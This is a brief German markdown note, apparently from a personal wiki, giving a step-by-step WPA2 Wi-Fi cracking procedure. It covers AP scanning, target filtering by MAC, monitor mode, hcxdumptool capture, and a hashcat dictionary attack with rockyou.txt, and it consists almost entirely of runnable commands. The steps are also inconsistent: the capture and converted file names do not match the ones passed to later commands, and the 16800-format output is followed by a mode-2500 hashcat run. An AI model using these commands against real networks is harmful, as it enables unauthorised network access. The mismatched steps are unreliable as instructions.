### Access Points ermitteln
`$ sudo iwlist scanning`
MAC-Adressen der APs in Datei speichern:
`A004603991A5` -> filter.txt

### Monitor Mode
Info:
`$ iwconfig`
Alternativ zu airmon-ng in [AirCrack](AirCrack.md):
```bash
$ sudo systemctl stop wpa_supplicant.service
$ sudo systemctl stop network-manager.service

$ sudo ip link set wlan0 down
$ sudo iw dev wlan0 set type monitor
$ sudo ip link set wlan0 up
$ sudo iw dev
```

### Durchführung
1. hcxdumptool
`$ sudo hcxdumptool -o test.pcapng -i wlan0mon --filtermode=2 --filterlist=filter.txt --enable_status=1`
- -o test.pcapng
	Ausgabedatei in "pcapng" Format
- -i wlan0mon
	Interface
- --filtermode=2
	Gibt an, wie die Mac-Filterliste zu verwenden ist. 1 (default) = Alle AP auf der Liste ignorieren, 2 = Nur die AP der Liste beachten.
- --filterlist=filter.txt
	Gibt die zu verwendende Filter-Liste an
- enable_status=1
	Ausgabe des Programmstatus auf der Konsole. 1 (default) = aktiviert, 0 = deaktiviert
2. HashCat
- Aufbereitung der Datei:
	`$ sudo hcxpcaptool -z capture.16800 capture.pcapng`
- Brute-Force-Attacke:
	`$ hashcat.exe -m 2500 capture.hccapx rockyou.txt`

Quelle: https://sarwiki.informatik.hu-berlin.de/WPA2-Angriff